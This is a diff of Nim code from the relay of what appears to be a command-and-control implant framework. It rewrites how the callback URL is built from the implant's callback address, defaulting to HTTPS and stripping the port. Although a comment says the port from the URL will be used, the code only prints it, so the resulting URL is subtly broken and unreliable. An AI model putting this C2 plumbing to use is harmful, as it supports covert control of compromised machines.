@@ -1483,17 +1483,28 @@ proc httpHandler() {.async.} =
                         # Build C2 URL from listener config
                         # Use implantCallbackIp since listenerHost is deprecated
                         var c2Host = listener.implantCallbackIp
-                        # Remove protocol if present (implantCallbackIp may have it)
+                        var c2Protocol = "https"  # Default to HTTPS for Replit
+                        
+                        # Extract protocol if present
                         if c2Host.startsWith("http://"):
+                            c2Protocol = "http"
                             c2Host = c2Host[7..^1]
                         elif c2Host.startsWith("https://"):
+                            c2Protocol = "https"
                             c2Host = c2Host[8..^1]
                         
                         # Remove port if present in host
                         if ":" in c2Host:
-                            c2Host = c2Host.split(":")[0]
+                            let parts = c2Host.split(":")
+                            c2Host = parts[0]
+                            # If port was in URL, use it instead of listenerPort
+                            if parts.len > 1:
+                                # Use the port from URL
+                                when defined debug:
+                                    echo "[RELAY] 🔌 Using port from URL: " & parts[1]
                         
-                        let c2Url = toLowerAscii(listener.listenerType) & "://" & c2Host & ":" & listener.listenerPort
+                        # Build final C2 URL (protocol from implantCallbackIp or HTTPS default)
+                        let c2Url = c2Protocol & "://" & c2Host
                         when defined debug:
                             echo "[RELAY] 🎯 C2 URL: " & c2Url
                         
